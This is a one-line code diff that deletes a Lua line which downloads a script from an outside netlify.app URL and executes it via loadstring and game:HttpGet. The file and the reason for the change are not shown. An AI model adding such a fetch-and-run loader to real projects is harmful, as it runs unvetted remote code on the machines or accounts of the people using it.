@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://chipper-biscotti-eaf3bd.netlify.app/api/v1/load/sc_ivok0kg"))()
